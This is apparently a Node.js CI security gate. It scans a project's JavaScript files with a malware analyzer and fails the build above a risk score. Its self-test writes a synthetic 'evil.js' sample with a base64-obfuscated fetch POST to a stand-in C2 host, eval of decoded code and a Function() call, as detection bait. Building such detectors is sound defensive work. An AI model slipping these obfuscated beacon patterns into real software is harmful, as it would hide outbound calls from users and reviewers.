#!/usr/bin/env node
/**
 * CI Security Gate — scan JavaScript files and fail the build above a risk
 * threshold. Designed to run in CI with deterministic exit codes.
 */
import { mkdtemp, readdir, readFile, rm, stat, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { analyzeSample } from '../../../tools/index.js'

const args = process.argv.slice(2)
const option = (name, fallback) => {
  const index = args.indexOf(name)
  return index >= 0 && args[index + 1] ? args[index + 1] : fallback
}

export async function collectJavaScriptFiles(root) {
  const files = []
  const walk = async (directory) => {
    for (const entry of await readdir(directory, { withFileTypes: true })) {
      const path = join(directory, entry.name)
      if (entry.isDirectory()) {
        if (['node_modules', '.git', 'dist'].includes(entry.name)) continue
        await walk(path)
      } else if (entry.isFile() && /\.(?:js|mjs|cjs)$/.test(entry.name)) {
        files.push(path)
      }
    }
  }
  await walk(root)
  return files.sort()
}

/** @param {{root: string, maxScore?: number, failOn?: 'malicious'|'suspicious'}} options */
export async function scanProject(options) {
  const files = await collectJavaScriptFiles(options.root)
  const results = []
  for (const file of files) {
    const source = await readFile(file, 'utf8')
    const info = await stat(file)
    if (info.size > 2_000_000) continue
    const analysis = await analyzeSample(source, { name: file, logLevel: 'silent', seed: 0x5eed, network: { policy: 'deny' } })
    const report = analysis.report
    results.push({
      file,
      size: info.size,
      verdict: report.verdict.level,
      score: report.verdict.score,
      reasons: report.verdict.reasons.map((reason) => reason.code),
      iocs: report.static.iocs.urls.map((entry) => entry.value).slice(0, 5),
    })
  }
  const failOn = options.failOn ?? 'malicious'
  const maxScore = options.maxScore ?? (failOn === 'suspicious' ? 25 : 60)
  const failures = results.filter((result) => result.score >= maxScore || (failOn === 'malicious' && result.verdict === 'malicious'))
  return { scanned: results.length, failures, results, exitCode: failures.length > 0 ? 2 : 0 }
}

async function selfTest() {
  const directory = await mkdtemp(join(tmpdir(), 'ci-gate-'))
  try {
    await writeFile(join(directory, 'clean.js'), 'export const sum = (a, b) => a + b;\n', 'utf8')
    await writeFile(
      join(directory, 'evil.js'),
      'var u = atob("aHR0cHM6Ly9jMi5leGFtcGxlLnRlc3QveA==");\nfetch(u, { method: "POST", body: btoa("x") }).catch(function(){});\nfetch("https://c2b.example.test/y").catch(function(){});\neval(atob("Y29uc29sZS5sb2coMSk="));\nlocalStorage.setItem("s", "1");\ndocument.body.appendChild(document.createElement("div"));\nFunction("return 1")();\nsetTimeout(function(){ console.log("t") }, 100);\n',
      'utf8',
    )
    const report = await scanProject({ root: directory, failOn: 'malicious' })
    if (report.scanned !== 2) throw new Error(`expected 2 files, got ${report.scanned}`)
    if (report.failures.length !== 1) throw new Error(`expected 1 failure, got ${report.failures.length}`)
    if (report.exitCode !== 2) throw new Error('expected gate failure exit code')
    if (!report.failures[0].iocs.some((url) => url.includes('c2.example.test'))) throw new Error('IOC missing')
    const strict = await scanProject({ root: directory, failOn: 'suspicious', maxScore: 25 })
    if (strict.failures.length < 1) throw new Error('suspicious threshold did not fire')
    console.log(`gate: scanned=${report.scanned} failures=${report.failures.length} exit=${report.exitCode}`)
    console.log('SELFTEST OK')
  } finally {
    await rm(directory, { recursive: true, force: true })
  }
}

async function main() {
  if (args.includes('--self-test')) return selfTest()
  if (args.includes('--help') || !option('--path')) {
    console.log('CI Security Gate\n  --path <dir> [--max-score 60] [--fail-on malicious|suspicious] [--json]\n  --self-test')
    if (!option('--path')) process.exitCode = 2
    return
  }
  const report = await scanProject({
    root: option('--path'),
    maxScore: option('--max-score') ? Number(option('--max-score')) : undefined,
    failOn: option('--fail-on', 'malicious'),
  })
  if (args.includes('--json')) {
    console.log(JSON.stringify(report, null, 2))
  } else {
    for (const result of report.results) {
      console.log(`${result.verdict.padEnd(10)} ${String(result.score).padStart(3)}  ${result.file}`)
    }
    console.log(`${report.failures.length} gate failure(s) / ${report.scanned} files`)
  }
  process.exitCode = report.exitCode
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(`error: ${error.message}`)
    process.exitCode = 1
  })
}
